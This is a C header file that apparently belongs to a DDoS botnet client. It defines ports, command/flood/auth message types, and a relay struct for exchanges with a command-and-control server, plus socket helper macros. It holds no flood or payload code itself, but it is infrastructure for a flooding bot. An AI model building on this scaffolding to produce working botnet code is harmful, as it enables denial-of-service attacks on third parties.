#pragma once
//#pragma GCC diagnostic ignored "-Wunused-result"
#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>

#include "debug.h"

enum
{
	STDIN = 0,
	STDOUT = 1,
	STDERR = 2,
	// Boolean logic true/false
	TRUE = 1,
	FALSE = 0,
	MAX_DNS_QUERY_TRIES = 15,
	QUERY_TIME = 6, // max / 10
	TAB = 8,
	BIND_PORT = 3132,
	REPORT_PORT = 6565,
	TYPE_COMMAND = 0,
	TYPE_FLOOD = 1,
	TYPE_AUTH = 2
};

// Will be used as information exchanged between the client and the cnc to decide if we want a flood or to call another function
struct relay
{
	uint8_t type;
	uint16_t b1, b2, b3, b4, b5, b6;
	char buf[64];
};

uint32_t LOCAL_ADDRESS;
static int enable = 1;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
#define REUSE_ADDR(fd) (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)))
#define REUSE_PORT(fd) (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &enable, sizeof(enable)))

#define PACKED __attribute__((packed))
#define CONSTRUCTOR __attribute__((constructor))

#define LOCALHOST (INET_ADDR(127,0,0,1))
